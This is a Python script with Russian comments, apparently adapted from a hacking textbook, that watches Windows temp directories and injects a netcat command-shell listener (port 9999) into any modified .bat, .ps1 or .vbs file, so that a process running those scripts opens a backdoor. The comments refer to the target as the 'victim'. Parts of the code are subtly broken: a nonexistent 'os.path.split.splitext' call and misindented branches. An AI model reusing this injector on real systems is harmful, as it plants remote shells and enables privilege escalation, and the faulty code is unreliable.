"""Средство мониторинга файлов, и автоматического внедрения кода"""
import os
import tempfile
import threading
import win32con
import win32file


FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001
# PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]
PATHS = ['', tempfile.gettempdir()]
NETCAT = 'netcat.exe'
TGT_IP = '192.168.0.104' # это IP-адрес жертвы (компьютера с Windows, на который будет происходить внедрение
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'


"""Вначале мы создаем словарь фрагментов кода, которые соответствуют тому или иному расширению файлов . Каждый
     фрагмент содержит уникальный маркер и код, который мы хотим внедрить. Маркер нужен для того, чтобы избежать
    бесконечных циклов в ситуациях, когда мы видим, что файл изменился, вставляем наш код и сами воспринимаем это 
    действие как событие изменения файла. К тому же по мере выполнения этого цикла файл рано или поздно вырастет
    до гигантских размеров и жесткий диск сойдет с ума."""
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n",
             f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}


def inject_code(full_filename, contents, extension):
    """ Вместо этого программа проверяет наличие маркера и, если он
    есть, не модифицирует файл повторно. Дальше функция inject_code производит собственно внедрение кода и проверку
    маркера. Убедившись в том, что маркер отсутствует , мы записываем его вместе с кодом, который, по нашему замыслу,
     должен выполнить атакуемый процесс """
    if FILE_TYPES[extension][0].strip() in contents:
        return

    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')


def monitor(path_to_watch):
    """Мы создаем список каталогов, которые хотим отслеживать , — в нашем случае это две широко используемые папки для
    временных файлов. Если вам захочется понаблюдать за другими местами, можете отредактировать этот список по своему
    усмотрению. Для каждого из этих путей мы создаем поток мониторинга, который вызывает функцию start_monitor. Вначале
    она пытается получить дескриптор каталога, за которым мы хотим следить . Затем вызывается функция
    ReadDirectoryChangesW , которая уведомляет нас о вносимых изменениях. Мы получаем имя измененного файла и тип
    произошедшего события . Дальше выводим полезную информацию о том, что случилось с этим конкретным файлом, и если
    обнаружилось, что он изменен, отображаем для наглядности все его содержимое """
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    extension = os.path.split.splitext(full_filename)[1]  # извлекаем расширение файла

                if extension in FILE_TYPES:  # сопоставляем его с нашим словарем известных файловых типов
                    print(f'[*] Modified {full_filename}')
                    print('[vvv] Dumping contents...')
                    try:
                        with open(full_filename) as f:
                            contents = f.read()

                        inject_code(full_filename, contents, extension)
                        print(contents)
                        print('[^^^] Dump complete.')
                    except Exception as e:
                        print(f'[!!!] Dump failed. {e}')
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknow action on {full_filename}')
        except Exception:
            pass


if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path, ))
        monitor_thread.start()


